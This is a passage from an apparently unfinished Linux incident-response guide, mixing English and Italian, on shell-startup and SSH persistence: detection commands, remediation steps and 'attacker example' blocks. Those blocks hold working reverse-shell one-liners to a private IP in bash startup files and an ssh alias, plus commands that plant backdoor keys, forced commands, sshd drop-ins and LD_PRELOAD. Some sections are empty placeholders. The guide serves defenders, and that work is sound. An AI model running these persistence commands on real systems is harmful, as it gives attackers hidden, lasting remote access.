lsattr ~/.bashrc ~/.bash_profile /etc/profile.d/*.sh 2>/dev/null | grep -E '^....i'
```

#### Remediation
```bash
# Ripristino dotfile utente da template di sistema (perde personalizzazioni legittime)
cp /etc/skel/.bashrc ~/.bashrc
```
#### Attacker example

**Reverse shell via `~/.bashrc`**
```bash
# Added to ~/.bash_profile — runs on every SSH login
(nohup bash -i >/dev/tcp/192.168.1.1/1337 0<&1 2>&1 &)

# Esportata in ~/.profile o /etc/environment — eseguita ad ogni invocazione di sh non interattiva (es. cron con #!/bin/sh)
export ENV=/tmp/.hidden_init
echo '(nohup bash -i >/dev/tcp/192.168.1.1/1337 0<&1 2>&1 &)' > /tmp/.hidden_init

# Rimuovi file di startup malevoli system-wide
rm /etc/profile.d/malicious.sh
# Force re-source for all new sessions (existing sessions keep old environment)

# Ricarica una shell pulita; verifica che alias e trap siano rimossi
exec bash

# Verifica che trap DEBUG non sia attivo
trap -p DEBUG

# Verifica che file di startup non contengano pattern sospetti
grep -E 'nohup|/dev/tcp|base64|curl|wget' ~/.bashrc ~/.profile /etc/profile.d/*.sh 2>/dev/null
```

The `nohup` + background `&` + subshell `()` combination prevents terminal freeze and keeps the shell running after the initiating session ends.

**Reference**: [Effective Shell — Configuring the Shell](https://effective-shell.com/part-5-building-your-toolkit/configuring-the-shell/)

---

## System scope
Text `text` text
#### How they works
#### Primary locations

System-wide files can affect multiple users and generally require elevated privileges to modify.

| File or directory | Trigger or purpose |
|---|---|
| `/etc/profile` | System-wide login-shell initialization for shells that source it. |
| `/etc/profile.d/*.sh` | Files commonly sourced by `/etc/profile`. |
| `/etc/bash.bashrc` | System-wide interactive Bash configuration on Debian- and Ubuntu-based systems. |
| `/etc/bash.bash_logout` | System-wide Bash logout configuration on systems that support it. |
| `/etc/zshenv` | System-wide Zsh configuration, commonly read on every Zsh invocation. |
| `/etc/zprofile` | System-wide Zsh login-shell configuration. |
| `/etc/zshrc` | System-wide Zsh interactive-shell configuration. |
| `/etc/zlogin` | System-wide Zsh login-shell configuration. |
| `/etc/zlogout` | System-wide Zsh login-shell exit configuration. |
| `/etc/environment` | System-wide environment assignments; not a shell script on standard PAM implementations. |
| `/etc/security/pam_env.conf` | PAM environment configuration. |
| `/etc/security/environment` | Environment configuration on implementations that support it. |
| `/etc/profile.d/` | Common location for vendor and administrator shell initialization scripts. |

The actual Zsh system paths may be `/etc/zshenv`, `/etc/zprofile` and `/etc/zshrc`, or `/etc/zsh/zshenv`, `/etc/zsh/zprofile` and `/etc/zsh/zshrc`, depending on the distribution.

#### Detection
```bash
# Collect system-wide startup file metadata
for path in \
    /etc/profile \
    /etc/profile.d \
    /etc/bash.bashrc \
    /etc/bash.bash_logout \
    /etc/zshenv \
    /etc/zprofile \
    /etc/zshrc \
    /etc/zlogin \
    /etc/zlogout \
    /etc/zsh/zshenv \
    /etc/zsh/zprofile \
    /etc/zsh/zshrc \
    /etc/zsh/zlogin \
    /etc/zsh/zlogout \
    /etc/environment \
    /etc/security/pam_env.conf \
    /etc/security/environment
do
    [ -e "$path" ] || continue
    find "$path" -maxdepth 1 -type f \
        -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
        2>/dev/null
done
```

```bash
# Review system-wide shell initialization files
for path in \
    /etc/profile \
    /etc/bash.bashrc \
    /etc/bash.bash_logout \
    /etc/zshenv \
    /etc/zprofile \
    /etc/zshrc \
    /etc/zlogin \
    /etc/zlogout \
    /etc/zsh/zshenv \
    /etc/zsh/zprofile \
    /etc/zsh/zshrc \
    /etc/zsh/zlogin \
    /etc/zsh/zlogout
do
    [ -f "$path" ] || continue
    printf '=== %s ===\n' "$path"
    sed -n '1,240p' "$path"
done
```

```bash
# Review profile.d scripts without assuming that every file ends in .sh
find /etc/profile.d \
    -maxdepth 1 \
    -type f \
    -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
    -exec sed -n '1,240p' {} \; \
    2>/dev/null
```

```bash
# Find recently modified startup and environment files
find /etc/profile \
    /etc/profile.d \
    /etc/bash.bashrc \
    /etc/zsh \
    /etc/environment \
    /etc/security \
    /home \
    /root \
    -xdev \
    -type f \
    \( -name '.*rc' \
       -o -name '.*profile' \
       -o -name '.*login' \
       -o -name '.*logout' \
       -o -name '*.sh' \
       -o -name 'config.fish' \
       -o -name 'environment' \
       -o -name 'pam_env.conf' \) \
    -newermt '7 days ago' \
    -exec stat --printf='%y %A %U:%G %s %n\n' {} \; \
    2>/dev/null
```

This detects recent content or metadata changes according to filesystem timestamps. It does not establish file creation time and may miss files on separate mount points.

```bash
# Identify startup files writable by group or others
find /etc/profile \
    /etc/profile.d \
    /etc/bash.bashrc \
    /etc/zsh \
    /etc/environment \
    /etc/security \
    /home \
    /root \
    -xdev \
    -type f \
    \( -name '.*rc' \
       -o -name '.*profile' \
       -o -name '.*login' \
       -o -name '.*logout' \
       -o -name '*.sh' \
       -o -name 'config.fish' \) \
    -perm /022 \
    -ls \
    2>/dev/null
```

```bash
# Check for unexpected ownership
find /etc/profile \
    /etc/profile.d \
    /etc/bash.bashrc \
    /etc/zsh \
    -xdev \
    -type f \
    \( -name '*.sh' -o -name 'zshenv' -o -name 'zprofile' -o -name 'zshrc' \) \
    ! -user root \
    -ls \
    2>/dev/null
```

User startup files are normally owned by their corresponding users. A root-owned user startup file is not automatically malicious, but it should be explained and correlated with the account-management model.

#### Check Immutable and Extended Attributes

```bash
# Inspect extended attributes and immutable flags where supported
for path in \
    /root/.bashrc \
    /root/.bash_profile \
    /etc/profile \
    /etc/profile.d
do
    [ -e "$path" ] || continue
    lsattr -d "$path" 2>/dev/null
    getfattr -d -m- "$path" 2>/dev/null
done
```

An immutable startup file may indicate anti-remediation behavior, but immutable attributes can also be legitimate. Preserve the attribute state before changing it.

#### Remediation
```bash
```
#### Attacker example
```bash
```

---

## Alias
Text `text` text
#### How they works
#### Primary locations (path)
#### Detection
```bash
# Pattern di persistence comuni; reverse shell, decoder, network utilities, hook e variabili di init POSIX/bash
grep -RInE 'LD_PRELOAD|BASH_ENV|(^|[[:space:]])ENV=|CDPATH=|PROMPT_COMMAND|trap[[:space:]].*DEBUG|(^|[[:space:]])alias[[:space:]]|export[[:space:]]+PATH|/dev/tcp|curl|wget|base64|python.*-c|perl.*-e|socat|nc[[:space:]]' \
  /etc/profile /etc/profile.d /etc/environment /etc/security /home /root 2>/dev/null
```
#### Remediation
```bash
# Identifica dove è definito un alias malevolo
grep -R "alias ssh=" /etc /root /home 2>/dev/null

# Rimuovi il bit immutabile PRIMA di editare, altrimenti sed -i fallisce silenziosamente
chattr -i ~/.bashrc 2>/dev/null
sed -i '/alias ssh=/d' ~/.bashrc

# Rimuovi alias malevolo da ~/.bashrc senza aprire editor
sed -i '/alias ssh=/d' ~/.bashrc
sed -i '/trap .*DEBUG/d' ~/.bashrc
sed -i '/nohup.*\/dev\/tcp/d' ~/.bashrc

# Disattiva trap e alias nella sessione corrente
trap - DEBUG
unalias ssh 2>/dev/null

# Verifica che alias malevolo sia rimosso
source ~/.bashrc
alias           # confirm malicious alias is gone
type ssh        # should return: ssh is /usr/bin/ssh
```
#### Attacker example

**Alias hijacking example:**
```bash
# Attacker adds to ~/.bashrc — intercepts every ssh command
alias ssh='(bash -i >/dev/tcp/192.168.1.1/4444 0<&1 2>&1 &) && /usr/bin/ssh'
```

---

## Variables and Hooks

Review variables and shell features that can influence command execution:

- `PATH`
- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- `BASH_ENV`
- `ENV`
- `CDPATH`
- `PROMPT_COMMAND`
- `PS0`
- `SHELLOPTS`
- Exported shell functions
- Aliases
- Bash `trap DEBUG`
- Zsh `precmd`, `preexec` and `chpwd` hooks
- Shell functions with names that shadow administrative commands

### How It Works

A startup file is not necessarily executed in every shell. The shell type and invocation mode determine which files are read.

### Detection

#### Detect PATH Hijacking

```bash
# Identify PATH assignments and prepends in common startup locations
grep -RInE \
    '(^|[[:space:]])(export[[:space:]]+)?PATH[[:space:]]*=' \
    /etc/profile \
    /etc/profile.d \
    /etc/environment \
    /etc/security \
    /home \
    /root \
    2>/dev/null
```

For each suspicious PATH entry:

```bash
# Inspect ownership and permissions of PATH directories
printf '%s\n' "$PATH" |
tr ':' '\n' |
while IFS= read -r path; do
    [ -n "$path" ] || continue
    [ -d "$path" ] || {
        printf 'MISSING: %s\n' "$path"
        continue
    }

    stat --printf='%A %U:%G %n\n' "$path"
done
```

Look for directories that are:

- Writable by non-root users.
- Relative paths or empty PATH elements.
- Located under `/tmp`, `/var/tmp`, `/dev/shm`, or user home directories.
- Placed before trusted system directories.
- Introduced only for privileged users or service accounts.

#### Detect Hooks, Aliases and Functions

```bash
# Search for prompt hooks, DEBUG traps, aliases and shell functions
grep -RInE \
    'PROMPT_COMMAND|PS0|trap[[:space:]].*DEBUG|\
(^|[[:space:]])alias[[:space:]]|\
(^|[[:space:]])function[[:space:]]+[A-Za-z_][A-Za-z0-9_]*|\
^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*[[:space:]]*\(\)' \
    /etc/profile \
    /etc/profile.d \
    /etc/bash.bashrc \
    /etc/zsh* \
    /home \
    /root \
    2>/dev/null
```

Pay particular attention to aliases or functions shadowing:

```text
ssh
sudo
su
curl
wget
scp
sftp
git
python
perl
bash
sh
```

An alias or function may be legitimate, so validate:

```bash
type -a ssh
type -a sudo
type -a curl
```

Run these commands only in a controlled shell context. Do not source a suspicious startup file solely to inspect the resulting aliases or functions.

#### Detect Environment-Based Persistence

```bash
# Search environment configuration for high-risk variables
grep -RInE \
    'LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|(^|[[:space:]])ENV[[:space:]]*=|\
CDPATH|PROMPT_COMMAND|SHELLOPTS|ZDOTDIR' \
    /etc/environment \
    /etc/security \
    /etc/profile \
    /etc/profile.d \
    /etc/pam.conf \
    /etc/pam.d \
    /home \
    /root \
    2>/dev/null
```

Inspect current process environments without assuming that they are safe or complete:

```bash
# Review selected environment variables for active processes
for proc_dir in /proc/[0-9]*; do
    pid=${proc_dir##*/}

    [ -r "$proc_dir/environ" ] || continue

    env_data=$(tr '\0' '\n' < "$proc_dir/environ" 2>/dev/null) || continue

    printf '%s\n' "$env_data" |
        grep -E '^(PATH|LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|ENV|CDPATH|PROMPT_COMMAND|ZDOTDIR)=' |
        sed "s/^/PID=$pid /"
done
```

> Process environments may contain credentials, access tokens, proxy passwords and application secrets. Restrict access to the output and avoid collecting the complete environment unless required.

#### Check Multiplexer Configuration

```bash
# Locate screen and tmux configuration files
find /home /root /etc \
    -xdev \
    -type f \
    \( -name '.tmux.conf' \
       -o -name 'tmux.conf' \
       -o -name '.screenrc' \) \
    -ls \
    2>/dev/null
```

Review commands such as `run-shell`, `set-option`, `source-file` and custom shell invocations.

### Remediation

Preserve suspicious files, metadata, hashes, ownership, permissions and extended attributes before making changes.

```bash
# Create a restricted evidence directory
umask 077

evidence_dir="/var/tmp/shell-persistence-evidence-$(date -u +%Y%m%dT%H%M%SZ)-$$"
mkdir -p -- "$evidence_dir"
```

```bash
# Preserve a suspicious user startup file
cp --preserve=all -- \
    /home/<user>/.bashrc \
    "$evidence_dir/" 2>/dev/null

stat -- \
    /home/<user>/.bashrc \
    > "$evidence_dir/bashrc.metadata.txt" 2>/dev/null

sha256sum -- \
    /home/<user>/.bashrc \
    > "$evidence_dir/bashrc.sha256" 2>/dev/null

lsattr -- \
    /home/<user>/.bashrc \
    > "$evidence_dir/bashrc.attributes.txt" 2>/dev/null
```

If an immutable attribute prevents an authorized remediation, preserve its original state before changing it:

```bash
# Record and temporarily remove the immutable attribute if authorized
lsattr -- /home/<user>/.bashrc

chattr -i -- /home/<user>/.bashrc
```

Remove only the confirmed malicious lines or restore the file from a known-good baseline:

```bash
# Restore a user startup file from a verified baseline
install -o <user> -g <group> -m 600 \
    /trusted/baseline/.bashrc \
    /home/<user>/.bashrc
```

For system-wide files:

```bash
# Preserve a system-wide startup file before remediation
cp --preserve=all -- \
    /etc/profile.d/<suspicious-script>.sh \
    "$evidence_dir/" 2>/dev/null

sha256sum -- \
    /etc/profile.d/<suspicious-script>.sh \
    > "$evidence_dir/system-startup.sha256" 2>/dev/null
```

After approval and evidence preservation, disable rather than delete the suspicious file:

```bash
# Disable a suspicious system-wide startup script without deleting it
mv -- \
    /etc/profile.d/<suspicious-script>.sh \
    /etc/profile.d/<suspicious-script>.sh.disabled
```

For user startup files, prefer restoring a known-good file or editing a documented malicious block. Avoid broad commands such as:

```bash
sed -i '/pattern/d' ~/.bashrc
```

unless the exact pattern has been reviewed. Broad deletion can remove legitimate configuration and destroy evidence.

For environment variables:

- Remove unauthorized `BASH_ENV`, `ENV`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, or `ZDOTDIR` assignments.
- Review PAM environment configuration before changing it.
- Verify that the affected variable is not required by a legitimate application.
- Restart or recreate affected sessions only after volatile evidence is collected.

Existing shells retain their current environment and functions. A file change affects only future shells unless the current shell is explicitly reinitialized.

Do not source a suspicious startup file to validate remediation. Open a clean shell without startup files:

```bash
# Start a clean Bash process without user or system startup files
env -i \
    HOME="/home/<user>" \
    PATH="/usr/sbin:/usr/bin:/sbin:/bin" \
    TERM="${TERM:-dumb}" \
    bash --noprofile --norc -c '
        printf "PATH=%s\n" "$PATH"
        type -a ssh
        trap -p DEBUG
        alias
    '
```

```bash
# Verify that the suspicious startup file is absent or restored
stat -- \
    /home/<user>/.bashrc \
    /etc/profile.d/<suspicious-script>.sh \
    2>/dev/null
```

```bash
# Verify ownership, permissions and hashes
stat --printf='%A %U:%G %s %y %n\n' \
    /home/<user>/.bashrc \
    2>/dev/null

sha256sum -- \
    /home/<user>/.bashrc \
    2>/dev/null
```

```bash
# Verify that current Bash startup files do not contain known suspicious patterns
grep -nHIE \
    '/dev/tcp/|/dev/udp/|base64|curl|wget|nc[[:space:]]|\
PROMPT_COMMAND|trap[[:space:]].*DEBUG|LD_PRELOAD|BASH_ENV|\
nohup|setsid|mkfifo' \
    /home/<user>/.bashrc \
    /home/<user>/.bash_profile \
    /home/<user>/.profile \
    /etc/profile \
    /etc/profile.d/* \
    2>/dev/null
```

```bash
# Start a clean shell and verify aliases, functions and traps
env -i \
    HOME="/home/<user>" \
    PATH="/usr/sbin:/usr/bin:/sbin:/bin" \
    TERM="${TERM:-dumb}" \
    bash --noprofile --norc -c '
        printf "PATH=%s\n" "$PATH"
        type -a ssh
        type -a sudo
        trap -p DEBUG
        alias
        declare -F
    '
```

```bash
# Verify PATH directories and precedence
printf '%s\n' "/usr/sbin:/usr/bin:/sbin:/bin" |
tr ':' '\n' |
while IFS= read -r path; do
    stat --printf='%A %U:%G %n\n' "$path" 2>/dev/null
done
```

```bash
# Check new login behavior without sourcing suspicious files in the current session
su -s /bin/bash - <user> -c '
    printf "user=%s\n" "$USER"
    printf "shell=%s\n" "$SHELL"
    printf "path=%s\n" "$PATH"
    type -a ssh
    trap -p DEBUG
'
```

Use `su` only when authorized and only after collecting the relevant evidence. A new login can create authentication and session events.

```bash
# Verify system-wide startup file permissions
find /etc/profile.d \
    -maxdepth 1 \
    -type f \
    -printf '%M %u:%g %TY-%Tm-%TdT%TH:%TM:%TS%Tz %p\n' \
    2>/dev/null
```

```bash
# Confirm no unauthorized environment assignments remain
grep -RInE \
    'LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|(^|[[:space:]])ENV[[:space:]]*=|\
PROMPT_COMMAND|ZDOTDIR' \
    /etc/environment \
    /etc/security \
    /etc/profile \
    /etc/profile.d \
    /home/<user> \
    2>/dev/null
```

### Attacker Example

#### Reverse Shell Through Bash Startup

```bash
# Example only: executes when the affected user starts a Bash login shell
cat >> /home/<user>/.bash_profile <<'EOF'
# LAB ONLY
if [ -n "$SSH_CONNECTION" ]; then
    /bin/echo "Lab payload placeholder"
fi
EOF
```

The example intentionally uses a harmless placeholder rather than a real reverse shell. In an actual incident, treat any startup-file entry that launches a network connection, background process, interpreter, decoder, or hidden payload as suspicious until validated.

#### Environment-Based Startup

```bash
# Example only: defines a custom Bash startup file for non-interactive shells
cat >> /home/<user>/.profile <<'EOF'
# LAB ONLY
export BASH_ENV="/home/<user>/.config/bash/noninteractive-init"
EOF
```

A malicious actor could use `BASH_ENV` to cause commands to be sourced by non-interactive Bash processes. The variable is not inherently malicious and may be used legitimately; validate the referenced file, owner, permissions and consumers.

#### Alias or Function Hijacking

```bash
# Example only: demonstrates command shadowing without executing a payload
cat >> /home/<user>/.bashrc <<'EOF'
# LAB ONLY
ssh() {
    printf '%s\n' "Lab wrapper invoked"
    command ssh "$@"
}
EOF
```

A suspicious alias or function may shadow security-sensitive commands such as `ssh`, `sudo`, `su`, `curl`, or `scp`. Use `type -a <command>` to determine whether the command resolves to an alias, function, builtin, or executable.

#### SSH Forced Command

```text
# Example only: suspicious authorized_keys option
command="/usr/local/bin/lab-wrapper",no-port-forwarding,no-agent-forwarding ssh-ed25519 AAAA...
```

A `command=` option in `authorized_keys` forces a command when the key is used. Correlate the referenced wrapper with file ownership, timestamps, hashes, SSH logs and the originating source address.

---

# SSH Persistence

## Why it matters

SSH is the primary remote administration channel on Linux. An attacker who adds a public key, modifies the sshd configuration, or alters scripts executed during login can maintain authenticated, encrypted access even after passwords have been reset.

The authorized_keys file may be stored outside the default ~/.ssh/authorized_keys path because AuthorizedKeysFile can be redefined in the active sshd configuration. Directives such as command=, ForceCommand and AuthorizedKeysCommand can also trigger code execution during or after authentication.

During the investigation:
- Identify keys recently added to privileged or service accounts.
- Correlate configuration changes and authentications with source IPs, processes and network connections.
- Review keys containing forced commands, environment variables, or forwarding options.
- Acquire relevant files and logs before making changes.

---

## Malicious `authorized_keys` entries

Unauthorized SSH public keys in `authorized_keys`

### Primary locations

**User scope:**

| Path | Description |
|---|---|
| `~/.ssh/authorized_keys` | Public keys permitted to authenticate as this user |
| `/root/.ssh/authorized_keys` | Keys permitted for root login |
| `~/.ssh/config` | Client config — can contain `ProxyCommand` abuse |
| `~/.ssh/known_hosts` | Can reveal pivot targets |

**Server scope:**

| Path | Description |
|---|---|
| `/etc/ssh/sshd_config` | Main SSH server config |
| `/etc/ssh/sshd_config.d/` | Drop-in overrides — often overlooked |
| `/etc/ssh/ssh_config` | Global client config |
| `/etc/ssh/ssh_config.d/` | Client config drop-ins |

### Detection
- Newly added public keys in privileged or service-account `authorized_keys` files.
- Keys placed in nonstandard user homes or accounts that should not allow interactive login.
- `ForceCommand`, `Match`, `AuthorizedKeysCommand`, `PermitUserEnvironment`, or other directives in `sshd_config` and its include directories that alter authentication flow or trigger command execution.
- `ProxyCommand` and unusual client configuration when investigating compromised admin workstations or jump boxes.
- Excessively permissive SSH server settings such as root login or weak authentication combinations, although these are hardening findings rather than direct persistence by themselves.
- Review ownership, permissions and timestamps on `.ssh` directories and key files.
- Map keys to expected administrators and deployment processes.
- Correlate suspicious keys or SSH config changes with `auth.log`, `secure`, `journalctl`, `last` and identity change records.

```bash
# Identify the effective authorized-key configuration
sshd -T 2>/dev/null | grep -i authorizedkeysfile

# Tutti i file authorized_keys (incl. authorized_keys2 e path non standard); superficie primaria
find / -xdev -type f \( -name "authorized_keys" -o -name "authorized_keys2" \) -exec stat -c '%a %U:%G %y %n' {} \; -exec cat {} \; 2>/dev/null

#Correlate suspicious keys with SSH authentication logs:
grep "Accepted publickey" /var/log/auth.log* 2>/dev/null | awk '{print $1,$2,$3,$9,$11}'
grep "Accepted publickey" /var/log/secure* 2>/dev/null | awk '{print $1,$2,$3,$9,$11}'
- Focus on:
  - Keys added recently (timestamps on `.ssh` and `authorized_keys`)
  - Keys on non-interactive or system accounts that should not allow SSH login
  - Keys not attributable to known administrators or deployment tooling  

# Chiavi con opzioni command=/environment=; esecuzione codice al login indipendente da sshd_config
grep -RInE '^(command|environment)=' /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null

# Permessi, ownership e timestamp su .ssh e authorized_keys; SSH ignora silenziosamente le chiavi se troppo permissivi
stat -c '%a %U:%G %y %n' /root/.ssh /root/.ssh/authorized_keys 2>/dev/null
find /home -maxdepth 2 -name ".ssh" -type d -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null

# File SSH (config e chiavi) modificati negli ultimi 7 giorni
find /etc/ssh /root/.ssh /home/*/.ssh -xdev -mtime -7 -type f -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null

# Configurazione SSH server; verifica ownership e timestamp
find /etc/ssh -type f -print -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null

# Fingerprint chiavi SSH; identifica chiavi note e anomale
ssh-keygen -lf /root/.ssh/authorized_keys 2>/dev/null
```

- Acquisire copie forensi di tutti i file `authorized_keys`, `sshd_config`, `ssh_config` e drop-in.
- Registrare ownership, permission, hash e timestamp.
- Acquisire log SSH (`/var/log/auth.log`, `/var/log/secure`, journal sshd).
- Documentare sessioni SSH attive (`who`, `w`, `last`).

### Remediation

```bash
# Rimuovi chiave specifica da authorized_keys; identifica prima con fingerprint
ssh-keygen -lf /root/.ssh/authorized_keys  # Lista fingerprint
grep -v "attacker_comment" /root/.ssh/authorized_keys > /tmp/ak_clean  # Rimuovi chiave
mv /tmp/ak_clean /root/.ssh/authorized_keys  # Sostituisci file
chmod 600 /root/.ssh/authorized_keys  # Ripristina permission corrette
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Test configurazione prima di riavviare sshd; previene lockout
sshd -t && systemctl restart sshd

# Hardening sshd_config; disabilita root login e password auth se appropriato
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sshd -t && systemctl restart sshd

# Verifica che chiavi malevole siano rimosse
find / -name authorized_keys -exec grep -l "attacker_comment" {} \; 2>/dev/null

# Verifica che sshd_config non contenga directive sospette
grep -E 'ForceCommand|AuthorizedKeysCommand' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null

# Verifica login SSH recenti
journalctl -u sshd --since '1 hour ago' | grep -i 'accepted'
```

**Attacker examples:**

```bash
# Add attacker's public key to root
echo "ssh-rsa AAAA...attacker_key..." >> /root/.ssh/authorized_keys

# sshd_config backdoor — run a command on every login
echo 'ForceCommand /tmp/.svc' >> /etc/ssh/sshd_config.d/99-override.conf

# Chiave con comando forzato — esegue il payload ad ogni login, la chiave appare comunque "legittima" a un controllo superficiale
echo 'command="/tmp/.svc &",no-pty,no-X11-forwarding ssh-rsa AAAA...' >> /root/.ssh/authorized_keys

# AuthorizedKeysCommand — fetch keys from attacker-controlled URL
AuthorizedKeysCommand /usr/local/bin/fetch-keys.sh
AuthorizedKeysCommandUser nobody
```

---

## Forced commands in `authorized_keys` and SSH rc files

Command-on-login via `authorized_keys`, `~/.ssh/rc` and `/etc/ssh/sshrc`

### Paths to verify

- `/root/.ssh/authorized_keys`
- `/home/*/.ssh/authorized_keys`
- `~/.ssh/rc` (for any user)
- `/etc/ssh/sshrc`

### Detection

- Search for `command=` / `environment=` options in `authorized_keys`:

  ```bash
  grep -RInE '^(command|environment)=' \
    /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null
  ```

- Discover and inspect SSH rc scripts:

  ```bash
  # Per-user rc
  find / -xdev -path '*/.ssh/rc' -type f \
    -exec stat -c '%a %U:%G %y %n' {} \; -exec cat {} \; 2>/dev/null

  # System-wide rc
  [ -f /etc/ssh/sshrc ] && stat -c '%a %U:%G %y %n' /etc/ssh/sshrc && cat /etc/ssh/sshrc
  ```

- Correlate with recent logins:

  ```bash
  journalctl -u ssh -u sshd --since '7 days ago' 2>/dev/null
  last -ai; lastb -ai 2>/dev/null
  ```

### Remediation

- Remove or rewrite malicious `command=` / `environment=` entries:

  ```bash
  sed -i '/command="\/tmp\/\.svc/d' /root/.ssh/authorized_keys
  ```

- Quarantine rc-based persistence:

  ```bash
  mv /etc/ssh/sshrc /var/tmp/sshrc.malicious.bak
  find / -xdev -path '*/.ssh/rc' -type f -exec mv {} {}.disabled \; 2>/dev/null
  ```

- Validate configuration before restart:

  ```bash
  sshd -t && systemctl restart sshd
  ```

### Attacker example

```bash
# Forced-command key in root’s authorized_keys: payload runs at every login
echo 'command="/tmp/.svc &",no-pty,no-X11-forwarding ssh-rsa AAAA... attacker_cmd' \
  >> /root/.ssh/authorized_keys

# System-wide rc backdoor
cat << 'EOF' >> /etc/ssh/sshrc
/bin/bash -c "/usr/local/sbin/.hidden_ssh_backdoor.sh &"
EOF
```

---

## Malicious `sshd_config` and drop-in overrides

Backdoored SSH server configuration (`sshd_config` and `sshd_config.d/`)

### Paths to verify

- `/etc/ssh/sshd_config`
- `/etc/ssh/sshd_config.d/`

Key directives to review:

- `ForceCommand`
- `Match`
- `AuthorizedKeysCommand`
- `PermitRootLogin`
- `PasswordAuthentication`
- `Include`
- `PermitUserEnvironment`
- `TrustedUserCAKeys`
- `AuthorizedPrincipalsFile`
- `AuthorizedPrincipalsCommand`[cite:11][cite:6][cite:8][cite:15]  

### Detection

- List SSH config files and metadata:

  ```bash
  find /etc/ssh -type f -print \
    -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null
  ```

- Grep for high-risk directives:

  ```bash
  grep -RInE 'AuthorizedKeys(Command|CommandUser|File)|ForceCommand|Match|PermitUserEnvironment|PermitRootLogin|PasswordAuthentication|Include|TrustedUserCAKeys|AuthorizedPrincipals(File|Command)' \
    /etc/ssh 2>/dev/null
  ```

- Identify recent changes:

  ```bash
  find /etc/ssh -xdev -mtime -7 -type f \
    -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null
  ```

### Remediation

- Remove or quarantine malicious drop-ins:

  ```bash
  rm /etc/ssh/sshd_config.d/99-override.conf
  ```

- Harden key settings:

  ```bash
  sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
  sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  ```

- Validate and restart:

  ```bash
  sshd -t && systemctl restart sshd
  ```

- Host key rotation (optional, high-impact):

  ```bash
  rm /etc/ssh/ssh_host_*
  ssh-keygen -A
  systemctl restart sshd
  ```

### Attacker example

```bash
# Drop-in that forces execution of a backdoor on every SSH login
cat << 'EOF' > /etc/ssh/sshd_config.d/99-override.conf
ForceCommand /tmp/.svc
PermitRootLogin yes
PasswordAuthentication yes
EOF
```

---

## Malicious SSH environment and client-side abuse

Environment-based injection (`~/.ssh/environment`) and abused client configuration (`~/.ssh/config`, `/etc/ssh/ssh_config.d/`)

> Client-side SSH persistence typically lives on compromised admin workstations or jump hosts and is part of lateral movement.

### Paths to verify

- `~/.ssh/environment`
- `~/.ssh/config`
- `/etc/ssh/ssh_config`
- `/etc/ssh/ssh_config.d/`

### Detection

- Dump SSH environments:

  ```bash
  find / -xdev -path '*/.ssh/environment' -type f -exec cat {} \; 2>/dev/null
  ```

- Look for `LD_PRELOAD`, proxy settings, or other injectable variables.  

- Identify suspicious client configuration:

  ```bash
  grep -RInE 'ProxyCommand|LocalCommand|RemoteCommand|PermitTunnel|AllowTcpForwarding' /etc/ssh ~/.ssh 2>/dev/null
  ```

- Use `~/.ssh/known_hosts` and outbound SSH logs to identify unusual pivot targets.[cite:8]  

### Remediation

- Neutralize hostile environment files:

  ```bash
  find / -xdev -path '*/.ssh/environment' -type f -exec mv {} {}.disabled \; 2>/dev/null
  ```

- Lock down `PermitUserEnvironment`:

  ```bash
  sed -i 's/^PermitUserEnvironment yes/PermitUserEnvironment no/' /etc/ssh/sshd_config
  sshd -t && systemctl restart sshd
  ```

- Clean or rebuild compromised client configuration and re-issue keys as needed.  

### Attacker example

```bash
# Environment backdoor – inject malicious library at login
echo 'LD_PRELOAD=/usr/local/lib/.evil.so' >> /home/admin/.ssh/environment

# Client-side pivot using ProxyCommand
cat << 'EOF' >> /home/admin/.ssh/config
Host internal-backdoor
  HostName 10.0.5.10
  ProxyCommand /usr/local/bin/.ssh_tunnel %h %p
EOF
```

---

## SSH CA and centralized key plumbing

Abused SSH certificate authorities and `AuthorizedKeysCommand`

### Paths to verify

- `/etc/ssh/sshd_config`
- `/etc/ssh/sshd_config.d/`

Key directives:

- `TrustedUserCAKeys`
- `AuthorizedPrincipalsFile`
- `AuthorizedPrincipalsCommand`
- `AuthorizedKeysCommand`
- `AuthorizedKeysCommandUser`[cite:8][cite:13][cite:15]  

### Detection

- Enumerate CA trust and dynamic key sources:

```bash
grep -RInE 'TrustedUserCAKeys|AuthorizedPrincipals(File|Command)|AuthorizedKeysCommand' /etc/ssh 2>/dev/null
```

- Assess:
  - Where CA public keys are stored and who controls them
  - What `AuthorizedKeysCommand` script does and where it fetches keys from
  - Whether an attacker-controlled identity or key store can silently grant access  

### Remediation

- Temporarily disable dynamic key sourcing:

```bash
sed -i 's/^AuthorizedKeysCommand /# AuthorizedKeysCommand /' /etc/ssh/sshd_config
sed -i 's/^AuthorizedKeysCommandUser /# AuthorizedKeysCommandUser /' /etc/ssh/sshd_config
sshd -t && systemctl restart sshd
```

- Validate CA keys and principals, replacing compromised CA public keys and regenerating certificates if needed.  
- Coordinate with identity / LDAP / IPA teams when centralized key storage is involved.[cite:8][cite:13]  

### Attacker example

```bash
# Configure sshd to trust a malicious CA and dynamic key source
cat << 'EOF' >> /etc/ssh/sshd_config.d/90-ca.conf
TrustedUserCAKeys /etc/ssh/ca_backdoor.pub
AuthorizedKeysCommand /usr/local/bin/fetch-keys.sh
AuthorizedKeysCommandUser nobody
EOF
```

---

# Scheduled Task Persistence

## Why it matters

